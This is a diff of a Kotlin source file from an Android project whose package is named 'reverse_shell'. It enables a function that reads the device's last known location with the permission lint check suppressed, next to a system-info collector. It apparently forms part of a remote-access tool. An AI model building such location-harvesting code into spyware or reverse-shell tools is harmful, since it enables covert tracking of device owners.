@@ -1,11 +1,16 @@
 package com.ironclad.saksham.reverse_shell
 
+import android.annotation.SuppressLint
 import android.content.Context
 import android.location.Location
+import android.location.LocationManager
 import android.net.Uri
 import android.os.Build
+import androidx.annotation.RequiresApi
 import com.google.android.gms.location.LocationServices
+import kotlinx.coroutines.tasks.await
 import java.io.File
+
 
 fun getSystemInfo(): String {
     val manufacturer = Build.MANUFACTURER
@@ -86,12 +91,21 @@ fun writeToFile(path:String, fileName: String, data: String): String {
 
 
 
-//@SuppressLint("MissingPermission")
-//suspend fun getCurrentLocation(context: Context): Location {
-//    val fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)
-//    val lastLocation = fusedLocationClient.lastLocation.await()
-//    lastLocation.let {
-//        return lastLocation
-//    }
-//}
+@RequiresApi(Build.VERSION_CODES.P)
+@SuppressLint("MissingPermission")
+suspend fun getCurrentLocation(context: Context): Location {
+    val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
+    val isLocationEnabled = locationManager.isLocationEnabled
+
+    if (isLocationEnabled){
+        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)
+        val lastLocation = fusedLocationClient.lastLocation.await()
+        lastLocation.let {
+            return lastLocation
+        }
+    }
+    else{
+        throw Exception("Location is disabled")
+    }
+}
 
